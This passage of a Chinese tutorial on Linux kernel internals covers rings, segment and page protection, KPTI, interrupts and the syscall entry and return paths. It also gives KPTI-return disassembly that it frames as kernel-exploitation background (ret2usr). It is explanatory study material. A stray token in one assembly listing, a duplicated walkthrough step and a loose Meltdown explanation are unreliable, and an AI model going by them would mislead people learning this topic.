<li><p><code>#56</code>：编译版本号。</p></li>
<li><p><code>SMP</code>：表示支持多处理器（Symmetric
Multi-Processing）。</p></li>
<li><p><code>Thu Sep 29 19:22:06 UTC 2022</code>：编译日期和时间。</p></li>
</ul></li>
<li><p><code>x86_64</code>：CPU 架构。</p></li>
</ul>
<h4 id="查看-procversion-文件">查看 <code>/proc/version</code> 文件</h4>
<p>Linux 将内核版本信息存储在 <code>/proc/version</code>
文件中，可以通过 <code>cat</code> 命令查看：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">Linux version 5.15.0-50-generic (buildd@lcy02-amd64-087) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) 2.34) <span class="comment">#56~20.04.1-Ubuntu SMP Thu Sep 29 19:22:06 UTC 2022</span></span><br></pre></td></tr></table></figure></div>
<h2 id="内核态函数调用">内核态函数调用</h2>
<p>在 Linux
内核态编程中，许多用户态的函数无法直接使用，需要使用内核提供的等效或类似功能的函数。</p>
<h3 id="printf-printk"><code>printf</code> → <code>printk()</code></h3>
<ul>
<li><p><strong>作用</strong>：</p>
<ul>
<li>内核态的打印函数，用于调试或记录内核日志信息。</li>
<li>输出的信息不会直接显示在用户态终端，而是存储在内核日志缓冲区中。</li>
</ul></li>
<li><p><strong>使用方式</strong>：</p>
<ul>
<li><p>格式与 <code>printf</code> 类似，支持格式化字符串。</p></li>
<li><p>日志信息可以通过 <code>dmesg</code> 命令查看：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | <span class="built_in">tail</span></span><br></pre></td></tr></table></figure></div></li>
</ul></li>
</ul>
<h3 id="memcpy-copy_from_user-copy_to_user"><code>memcpy</code> →
<code>copy_from_user()</code> / <code>copy_to_user()</code></h3>
<ul>
<li><p><strong>作用</strong>：</p>
<ul>
<li><code>copy_from_user()</code> 和 <code>copy_to_user()</code>
用于在内核空间和用户空间之间传递数据。</li>
<li><strong><code>memcpy</code>
不能跨越用户空间和内核空间</strong>，因为内核需要检查地址的合法性，防止非法访问用户内存。</li>
</ul></li>
<li><p><strong>使用方式</strong>：</p>
<ul>
<li><code>copy_from_user()</code>：将用户空间的数据复制到内核空间。</li>
<li><code>copy_to_user()</code>：将内核空间的数据复制到用户空间。</li>
</ul></li>
<li><p><strong>返回值</strong>：</p>
<ul>
<li><p><strong>成功</strong>：返回 0。</p></li>
<li><p><strong>失败</strong>：返回未成功复制的字节数。</p></li>
</ul></li>
</ul>
<h3 id="malloc-kmalloc"><code>malloc()</code> →
<code>kmalloc()</code></h3>
<ul>
<li><strong>作用</strong>：
<ul>
<li><code>kmalloc()</code> 是内核态的内存分配函数，类似用户态的
<code>malloc()</code>。</li>
<li>提供按需分配的动态内存，并从内核的物理内存区域中分配。</li>
</ul></li>
</ul>
<h3 id="free-kfree"><code>free()</code> → <code>kfree()</code></h3>
<ul>
<li><strong>作用</strong>：
<ul>
<li><code>kfree()</code> 用于释放 <code>kmalloc()</code>
分配的内存，类似用户态的 <code>free()</code>。</li>
</ul></li>
</ul>
<h1 id="ring-model">Ring Model</h1>
<h2 id="基本概念">基本概念</h2>
<p>Ring Model 是一种 <strong>CPU 权限级别（Privilege Level）</strong>
的分层架构，主要用于操作系统中处理权限隔离和保护。它通过硬件机制，限制不同权限级别的代码对系统资源的访问，从而提高系统的安全性和稳定性。</p>
<p>Ring Model 的分层通常分为 4 个等级，编号从 0 到
3：<code>Ring 0</code>，<code>Ring 1</code>， <code>Ring 2</code>，
<code>Ring 3</code>。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c715813e764b9d971b01092ef652bac5.png"
                     
                      
                
                ></p>
<p>尽管 x86 架构支持 4 级 Ring 模型，但 Linux 只使用了 <strong>Ring
0</strong> 和 <strong>Ring 3</strong>：</p>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr>
<th><strong>Ring</strong></th>
<th><strong>用途</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Ring 0</td>
<td><strong>内核态（Kernel
Mode）</strong>：操作系统核心代码运行的位置，包括内存管理、设备驱动、进程调度等。</td>
</tr>
<tr>
<td>Ring 3</td>
<td><strong>用户态（User Mode）</strong>：用户程序运行的位置，如
<code>bash</code>、<code>vim</code> 等。</td>
</tr>
</tbody>
</table>
<h2 id="实现方式">实现方式</h2>
<h3 id="段保护机制">段保护机制</h3>
<ul>
<li><strong>段（Segment）</strong> 是 x86
架构中内存管理的基础单元。每个段定义了一个线性地址范围，程序通过段选择子和偏移量访问内存。</li>
<li>CPU 使用段保护机制，通过段选择子（Segment
Selector）和段描述符（Descriptor）来控制不同权限级别（Ring）的内存访问，防止越权操作。</li>
</ul>
<h4 id="段选择子segment-selector">段选择子（Segment Selector）</h4>
<p>段选择子是存储在 CPU 段寄存器（代码段 <code>cs</code>、数据段
<code>ds</code>、栈段 <code>ss</code> 等）中的低 16
位值，标识了当前程序使用的段。它是程序访问内存段的入口，索引全局或局部段描述符表（GDT
或 LDT）。</p>
<p>段选择子的格式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| Index (13 bits) | TI (1 bit) | RPL (2 bits) |</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><strong>Index（段索引，13 位）</strong>：指向段描述符表（GDT 或
LDT）中的一个条目，标识具体的段。</p></li>
<li><p><strong>TI（Table Indicator，1
位）</strong>：决定段描述符表的类型：</p>
<ul>
<li>值为 <code>0</code> 表示选择 <strong>GDT（Global Descriptor
Table，全局描述符表）</strong>。</li>
<li>值为 <code>1</code> 表示选择 <strong>LDT（Local Descriptor
Table，局部描述符表）</strong>。</li>
</ul></li>
<li><p><strong>RPL（Requested Privilege Level，请求权限级别，2
位）</strong>：</p>
<ul>
<li>指定程序期望访问目标段时的权限级别，范围为 <code>0-3</code>。</li>
<li>通常，RPL 由调用方设定，用于在段访问中动态降低权限。</li>
</ul></li>
</ul>
<h4 id="段描述符descriptor">段描述符（Descriptor）</h4>
<p>每个段在 GDT 或 LDT
中对应一个段描述符。描述符包含了段的基地址、大小、类型和权限等信息。</p>
<p>段描述符在 64 位模式下的格式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| Base Address (32 bits) | Limit (20 bits) | Access Rights (8 bits) |</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><strong>Base Address（基地址，32 位）</strong>：段的起始地址。在
64 位模式下，基地址通常被固定为
<code>0</code>，即扁平内存模型。</p></li>
<li><p><strong>Limit（段大小，20
位）</strong>：定义段的大小（单位为字节）。在 64
位模式下，通常被忽略，因为地址空间被扩展到 48 位或更高。</p></li>
<li><p><strong>Access Rights（访问权限，8
位）</strong>：包含段的类型和权限字段：</p>
<ul>
<li><strong>类型位（Type）</strong>：定义段的用途，如代码段、数据段或系统段。不同的类型有不同的内存权限。</li>
<li><strong>S 位（Descriptor
Type）</strong>：区分系统段（S=0）和普通段（S=1）。
<ul>
<li><strong>S = 0</strong>：系统段（System
Segment），包含特定于系统使用的结构或功能，例如任务状态段（TSS）、中断描述符表（IDT）或局部描述符表（LDT）。</li>
<li><strong>S =
1</strong>：代码段或数据段，表示常规的用户态或内核态段，用于存储可执行代码或数据。</li>
</ul></li>
<li><strong>DPL（Descriptor Privilege
Level）</strong>：段的权限级别，范围为
<code>0-3</code>，表示对该段的访问要求。</li>
</ul></li>
</ul>
<h4 id="权限类型">权限类型</h4>
<ul>
<li><strong>CPL（Current Privilege Level）</strong>：
<ul>
<li>表示当前程序的运行权限级别，通常由 CS
寄存器的低两位（代码段段选择子）决定。</li>
<li><strong>CPL</strong> 的值必须低于或等于段描述符中的 DPL
才能访问该段。</li>
</ul></li>
<li><strong>RPL（Requested Privilege Level）</strong>：
<ul>
<li>请求访问段时指定的权限级别。通常由访存时使用的段寄存器的段选择子决定</li>
<li><strong>RPL</strong> 的值不能高于段的 DPL。</li>
</ul></li>
<li><strong>DPL（Descriptor Privilege Level）</strong>：
<ul>
<li>描述符中定义的段权限级别。</li>
</ul></li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>简单总结一下，就是当前的执行代码的权限（CPL）和请求访问内存的权限（RPL）都不能低于（值要小于等于）段描述符描述的目标内存的权限。</p>

    </div>
  </div>
<h4 id="权限检查过程">权限检查过程</h4>
<p>这里以 <code>mov rax, qword ptr ds:[0xdeadbeef]</code>
为例介绍一下段保护机制权限检查的过程。</p>
<ol type="1">
<li><p><strong>读取 <code>DS</code> 段选择子</strong>：CPU 从
<code>DS</code> 段寄存器中读取段选择子的值。</p></li>
<li><p><strong>读取段描述符</strong>：CPU 从 <code>DS</code>
段寄存器中读取段选择子的值。这里先根据段选择子的 <code>TI</code>
位确定是 GDT，然后根据 <code>Index</code> 字段中 GDT
中找到段描述符。</p></li>
<li><p><strong>检查 S 位（Descriptor
Type）</strong>：因为是访存操作，所以要求 S 位为 1（数据段）。</p></li>
<li><p><strong>检查 RPL（Requested Privilege Level）</strong>：CPU
会比较 <code>max(CPL, RPL)</code> 和目标段描述符的
<code>DPL</code>（Descriptor Privilege Level）。如果结果大于目标段的
DPL，则触发 <strong>General Protection Fault (GPF)</strong>。</p></li>
<li><p><strong>检查段描述符类型：</strong>根据段描述符的 <strong>Access
Rights</strong>
字段的<strong>类型位（Type）</strong>确认操作（读取数据）符合段的权限（RW
位）。</p></li>
</ol>
<h3 id="页保护机制">页保护机制</h3>
<p>在 64 位系统（如 x86_64
架构）中，<strong>页保护机制</strong>是内存管理的核心，通过分页（Paging）机制实现虚拟地址到物理地址的映射，同时提供<strong>细粒度的权限控制</strong>（例如用户空间与内核空间的隔离）。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>关于分页机制会在内存管理部分详细介绍，这里仅介绍权限管理相关内容。</p>

    </div>
  </div>
<h4 id="权限字段">权限字段</h4>
<p>每个页表条目（Page Table Entry, PTE）包含物理地址和权限信息：</p>
<ul>
<li><p><strong>P（Present）</strong>：第 0 位，表示页是否有效。如果为
<code>0</code>，表示页不在内存中（可能在磁盘上），访问时会触发
<strong>Page Fault</strong>。</p></li>
<li><p><strong>R/W（Read/Write）</strong>：第 1
位，表示页是否可写。如果为 <code>0</code>，则该页只读。</p></li>
<li><p><strong>U/S（User/Supervisor）</strong>：第 2
位，表示用户态（Ring 3）是否可以访问：</p>
<ul>
<li><p><strong>U = 1</strong>：用户态可访问。</p></li>
<li><p><strong>U = 0</strong>：仅内核态（Ring 0）可访问。</p></li>
</ul></li>
<li><p><strong>NX（No Execute）</strong>：第 63
位，表示页是否可执行：如果为 <code>1</code>，则该页不可执行（需要 CPU
支持 NX 位）。</p></li>
</ul>
<h4 id="linux-的-kpti-机制">Linux 的 KPTI 机制</h4>
<p><strong>Kernel Page Table Isolation（KPTI）</strong>
是一种内核内存隔离机制，用于解决 <strong>Meltdown 漏洞</strong>。</p>
<blockquote>
<p>Meltdown
是一种硬件级漏洞，该漏洞利用了现代处理器的分支预测和缓存特性，可以通过侧信道攻击绕过用户态与内核态的隔离，使得用户态程序可以读取内核内存中的敏感数据。</p>
<ul>
<li><p>当用户态访问内核地址时，尽管会触发权限检查失败，但在实际触发前，CPU
已经通过分支预测机制将数据加载到缓存中。</p></li>
<li><p>攻击者可以通过读取缓存侧信道（如时间测量等技术）获取这些数据。</p></li>
</ul>
</blockquote>
<p>KPTI 的核心思想是：</p>
<ul>
<li>在用户态运行时，将内核页表从地址空间中隔离，防止用户态程序对内核地址空间的任何访问。</li>
<li>仅在需要切换到内核态时（如系统调用或中断处理），恢复内核页表。</li>
</ul>
<p>在传统未开启 KPTI 的 Linux
系统中，内核页表和用户页表共存于同一张全局页表（PGD）。开启 KPTI
后，内核为用户态和内核态分别维护两张独立的页全局目录（PGD）。</p>
<ul>
<li><strong>内核页表</strong>：包含用户和内核地址空间的完整映射。</li>
<li><strong>用户页表</strong>：完整映射用户地址空间。但内核地址空间仅保留必要的条目（如系统调用入口和中断处理）。</li>
</ul>
<p>由于每张页全局目录表占用 4
KB，两张页表连续分配在内存中，因此两张全局页目录表的地址仅在第 13
位不同。</p>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/KPTI.drawio.svg"
                     
                      
                
                ></p>
<ul>
<li>用户态进入内核态：当用户态程序通过 <strong>系统调用</strong> 或
<strong>中断</strong>
进入内核态时，会执行用户态页表映射的系统调用入口代码。在这段代码会将
<strong>CR3 寄存器的第 13
位取反</strong>，切换到内核页表，这样就可以访问完整的内核空间。</li>
<li>内核态返回用户态：内核完成系统调用或中断处理后，需要切换回用户态，此时内核通过<strong>取反
CR3 的第 13
位</strong>，切换回用户页表。切换完成后，内核地址空间的绝大部分被剥离，仅保留必要的条目。</li>
</ul>
<h3 id="中断机制">中断机制</h3>
<p><strong>中断（Interrupt）</strong>
是硬件或软件引发的事件通知，用于中断当前任务的执行，将控制权转交给内核。在
x86_64 架构中，中断的处理由 <strong>中断描述符表（IDT）</strong>
和特权级检查共同完成。</p>
<p>中断按类型可以分为：</p>
<ul>
<li><p><strong>硬件中断</strong>：由硬件设备发出（如键盘输入、网卡通信）。</p></li>
<li><p><strong>软件中断</strong>：由程序发出（如 <code>int</code>
指令，或 <code>syscall</code>）。</p></li>
<li><p><strong>异常</strong>：由处理器在检测到程序错误（如除零、访问非法内存）时触发。</p></li>
</ul>
<h4 id="中断描述符表">中断描述符表</h4>
<p>中断描述符表（IDT, Interrupt Descriptor
Table）是一张存储中断处理程序入口的表，用于将中断向量映射到特定的处理程序。它在系统启动时由操作系统初始化。</p>
<p>IDT 是一个固定大小的表（最多 256 个条目），每个条目的结构如下：</p>
<table>
<colgroup>
<col style="width: 35%" />
<col style="width: 64%" />
</colgroup>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Offset (Low, Mid, High)</td>
<td>中断处理函数的地址（64 位虚拟地址）。</td>
</tr>
<tr>
<td>Selector</td>
<td>中断处理程序所在段的选择器，指向内核代码段（通常为
<code>__KERNEL_CS</code>）。</td>
</tr>
<tr>
<td>IST（Interrupt Stack Table）</td>
<td>指定中断发生时使用的内核栈索引，防止栈溢出。</td>
</tr>
<tr>
<td>Type</td>
<td>描述符类型（中断门或陷阱门）。</td>
</tr>
<tr>
<td>DPL（Descriptor Privilege Level）</td>
<td>描述符权限级别，限制低权限代码是否可以触发中断。</td>
</tr>
<tr>
<td>P（Present）</td>
<td>描述符是否有效。</td>
</tr>
</tbody>
</table>
<h4 id="中断处理流程">中断处理流程</h4>
<ol type="1">
<li><strong>触发中断</strong>：
<ul>
<li>事件来源：
<ul>
<li>硬件设备：如键盘输入。</li>
<li>软件：如 <code>int</code> 指令或异常。</li>
</ul></li>
<li>中断信号送达 CPU，触发中断向量。</li>
</ul></li>
<li><strong>中断向量查找</strong>：
<ul>
<li>CPU 根据中断号（Interrupt Number）在 IDT
中查找对应的处理程序入口。</li>
</ul></li>
<li><strong>权限检查</strong>：
<ul>
<li>检查触发中断的代码特权级别（CPL）是否符合 IDT 条目 DPL 的要求：
<ul>
<li><strong>CPL ≤ DPL</strong>：允许触发中断。</li>
<li><strong>CPL &gt; DPL</strong>：触发 <strong>General Protection
Fault（GPF）</strong>。</li>
</ul></li>
</ul></li>
<li><strong>切换上下文</strong>：
<ul>
<li>保存当前寄存器和程序计数器（RIP）到内核栈。</li>
<li>切换到指定的中断栈（根据 IST 索引），避免用户态栈溢出。</li>
</ul></li>
<li><strong>执行中断处理程序</strong>：
<ul>
<li>控制权转移到内核定义的中断处理程序，完成任务（如处理硬件请求）。</li>
</ul></li>
<li><strong>恢复上下文</strong>：
<ul>
<li>恢复寄存器和程序计数器，返回到被中断的程序或下一任务。</li>
</ul></li>
</ol>
<h3 id="用户态-内核态">用户态-&gt;内核态</h3>
<p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ul>
<li><p>通过 <code>swapgs</code> 切换 <code>GS</code> 段寄存器，将
<code>GS</code> 寄存器值和一个特定位置的值进行交换，目的是为了保存
<code>GS</code> 值，同时将该位置的值作为内核执行时的 <code>GS</code>
值使用。</p>
<ul>
<li><code>GS</code> 寄存器的作用是访问 CPU 特定的内存。</li>
</ul></li>
<li><p>将当前栈顶(用户空间栈顶)记录在 CPU 独占变量区域里，将 CPU
独占区域里记录的内核栈顶放入 <code>RSP/ESP</code> 。</p></li>
<li><p>通过 <code>push</code> 保存各寄存器值，具体代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS                <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11                      <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS                <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx                      <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax                      <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi                      <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi                      <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx                      <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu               <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS                  <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8                       <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9                       <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10                      <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11                      <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp                 <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>通过汇编指令判断是否为 <code>x32_abi</code>。(linux 32
位内核)</p></li>
<li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code>
相应位置继续执行系统调用。</p></li>
</ul>
<h3 id="内核态-用户态">内核态-&gt;用户态</h3>
<p>具体流程如下：</p>
<ul>
<li>通过 <code>swapgs</code> 恢复 <code>GS</code> 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code>
恢复到用户空间继续执行。如果使用 <code>iretq</code>
还需要给出用户空间的一些信息(<code>CS, eflags/rflags, esp/rsp</code>
等)，即 <code>trap_frame</code> 。</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></div>
<p>对于开启了 <code>KPTI</code>（内核页表隔离），我们不能像之前那样直接
<code>swapgs; iret</code>
返回用户态，而是在返回用户态之前还需要将用户进程的页表给切换回来</p>
<p>众所周知 Linux 采用四级页表结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而
CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI
的情况下用户态与内核态之间的切换便涉及到 CR3
的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD
两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样只需要将
CR3 的第 13 位取反便能完成页表切换的操作 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/248d52bc78f674d3af4f30326f6a0d3f.png"
                     
                      
                
                >
需要进行说明的是，在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，如下图所示，左侧是未开启
KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b8339a49544b7c530101ae2730a11e59.png"
                     
                      
                
                > KPTI
同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得
ret2usr 彻底成为过去式</p>
<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在
<code>arch/x86/entry/entry_64.S</code>
中提供了一个用于完成内核态页表切换回到用户态页表的函数
<code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在
<code>/proc/kallsyms</code> 中获得。</p>
<p><code>swapgs_restore_regs_and_return_to_usermode</code>
定义如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81c00fb0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:	nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">0xffffffff81c00fb5 &lt;swapgs_restore_regs_and_return_to_usermode+5&gt;:	pop    r15</span><br><span class="line">0xffffffff81c00fb7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:	pop    r14</span><br><span class="line">0xffffffff81c00fb9 &lt;swapgs_restore_regs_and_return_to_usermode+9&gt;:	pop    r13</span><br><span class="line">0xffffffff81c00fbb &lt;swapgs_restore_regs_and_return_to_usermode+11&gt;:	pop    r12</span><br><span class="line">0xffffffff81c00fbd &lt;swapgs_restore_regs_and_return_to_usermode+13&gt;:	pop    rbp</span><br><span class="line">0xffffffff81c00fbe &lt;swapgs_restore_regs_and_return_to_usermode+14&gt;:	pop    rbx</span><br><span class="line">0xffffffff81c00fbf &lt;swapgs_restore_regs_and_return_to_usermode+15&gt;:	pop    r11</span><br><span class="line">0xffffffff81c00fc1 &lt;swapgs_restore_regs_and_return_to_usermode+17&gt;:	pop    r10</span><br><span class="line">0xffffffff81c00fc3 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:	pop    r9</span><br><span class="line">0xffffffff81c00fc5 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:	pop    r8</span><br><span class="line">0xffffffff81c00fc7 &lt;swapgs_restore_regs_and_return_to_usermode+23&gt;:	pop    rax</span><br><span class="line">0xffffffff81c00fc8 &lt;swapgs_restore_regs_and_return_to_usermode+24&gt;:	pop    rcx</span><br><span class="line">0xffffffff81c00fc9 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:	pop    rdx</span><br><span class="line">0xffffffff81c00fca &lt;swapgs_restore_regs_and_return_to_usermode+26&gt;:	pop    rsi</span><br><span class="line">0xffffffff81c00fcb &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:	mov    rdi,rsp</span><br><span class="line">0xffffffff81c00fce &lt;swapgs_restore_regs_and_return_to_usermode+30&gt;:	mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81c00fd7 &lt;swapgs_restore_regs_and_return_to_usermode+39&gt;:	push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81c00fda &lt;swapgs_restore_regs_and_return_to_usermode+42&gt;:	push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81c00fdd &lt;swapgs_restore_regs_and_return_to_usermode+45&gt;:	push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81c00fe0 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:	push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81c00fe3 &lt;swapgs_restore_regs_and_return_to_usermode+51&gt;:	push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81c00fe6 &lt;swapgs_restore_regs_and_return_to_usermode+54&gt;:	push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81c00fe8 &lt;swapgs_restore_regs_and_return_to_usermode+56&gt;:	push   rax</span><br><span class="line">0xffffffff81c00fe9 &lt;swapgs_restore_regs_and_return_to_usermode+57&gt;:	xchg   ax,ax</span><br><span class="line">0xffffffff81c00feb &lt;swapgs_restore_regs_and_return_to_usermode+59&gt;:	mov    rdi,cr3</span><br><span class="line">0xffffffff81c00fee &lt;swapgs_restore_regs_and_return_to_usermode+62&gt;:	jmp    0xffffffff81c01024 </span><br><span class="line"></span><br><span class="line">0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;:	or     rdi,0x1000</span><br><span class="line">0xffffffff81c0102b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;:	mov    cr3,rdi</span><br><span class="line">0xffffffff81c0102e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;:	pop    rax</span><br><span class="line">0xffffffff81c0102f &lt;swapgs_restore_regs_and_return_to_usermode+127&gt;:	pop    rdi</span><br><span class="line">0xffffffff81c01030 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;:	swapgs </span><br><span class="line">0xffffffff81c01033 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;:	jmp    0xffffffff81c01060 &lt;native_iret&gt;</span><br><span class="line"></span><br><span class="line">0xffffffff81c01060 &lt;native_iret&gt;:	test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">0xffffffff81c01065 &lt;native_iret+5&gt;:	jne    0xffffffff81c01069 &lt;native_irq_return_ldt&gt;</span><br><span class="line">0xffffffff81c01067 &lt;native_irq_return_iret&gt;:	iretq </span><br></pre></td></tr></table></figure></div>
<p>大概操作如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov  rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov  cr3, rdi</span><br><span class="line">pop rax</span><br><span class="line">pop rdi</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br></pre></td></tr></table></figure></div>
<p>前面对寄存器赋值的操作与 <code>pt_regs</code> 结构体对应</p>
